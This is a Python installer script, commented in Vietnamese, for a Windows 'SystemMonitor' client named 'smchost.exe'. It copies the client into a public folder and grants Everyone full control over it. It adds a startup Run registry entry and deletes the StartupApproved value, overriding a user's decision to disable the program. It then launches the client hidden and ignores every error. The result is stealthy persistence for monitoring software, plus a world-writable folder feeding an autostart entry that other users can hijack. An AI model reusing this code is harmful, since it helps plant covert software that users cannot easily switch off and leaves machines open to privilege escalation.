import os
import sys
import shutil
import subprocess
import winreg
import platform

def install():
    target_dir = r"C:\Users\Public\SystemMonitor"
    exe_name = "smchost.exe"
    config_name = "config.ini"
    
    # 1. Xác định thư mục giải nén tạm thời của PyInstaller
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
        
    src_exe = os.path.join(base_path, exe_name)
    src_config = os.path.join(base_path, config_name)
    
    # 2. Tắt tiến trình cũ (nếu có) để tránh khóa tệp tin
    flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
    subprocess.run(["taskkill", "/f", "/im", exe_name], capture_output=True, creationflags=flags)
    
    # 3. Tạo thư mục đích nếu chưa tồn tại
    if not os.path.exists(target_dir):
        try:
            os.makedirs(target_dir)
        except Exception:
            pass
            
    # 4. Sao chép tệp tin ứng dụng và cấu hình
    dest_exe = os.path.join(target_dir, exe_name)
    dest_config = os.path.join(target_dir, config_name)
    
    try:
        if os.path.exists(src_exe):
            shutil.copy2(src_exe, dest_exe)
        if os.path.exists(src_config):
            # Luôn copy config.ini mới đè lên hoặc khởi tạo
            shutil.copy2(src_config, dest_config)
    except Exception:
        pass
        
    # 5. Phân quyền thư mục cho tất cả Users truy cập
    try:
        subprocess.run(["icacls", target_dir, "/grant", "Users:(OI)(CI)F", "/T"], capture_output=True, creationflags=flags)
        subprocess.run(["icacls", target_dir, "/grant", "Everyone:(OI)(CI)F", "/T"], capture_output=True, creationflags=flags)
    except Exception:
        pass
        
    # 6. Thiết lập Registry Run (Khởi động cùng hệ thống)
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    approved_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
    app_name = "smchost"
    app_path = f'"{dest_exe}" -minimized'
    
    # Thử HKLM (All Users)
    hklm_success = False
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteValue(key, app_name)
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        
        try:
            approved_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, approved_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(approved_key, app_name)
            winreg.CloseKey(approved_key)
        except Exception:
            pass
        hklm_success = True
    except Exception:
        pass
        
    # Nếu không có quyền Admin, fallback sang HKCU (Current User)
    if not hklm_success:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            try:
                winreg.DeleteValue(key, app_name)
            except FileNotFoundError:
                pass
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
            winreg.CloseKey(key)
            
            try:
                approved_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_path, 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(approved_key, app_name)
                winreg.CloseKey(approved_key)
            except Exception:
                pass
        except Exception:
            pass
            
    # 7. Khởi động Client chạy ngầm luôn
    try:
        subprocess.Popen([dest_exe, "-minimized"], creationflags=flags)
    except Exception:
        pass

if __name__ == "__main__":
    if platform.system() == "Windows":
        install()
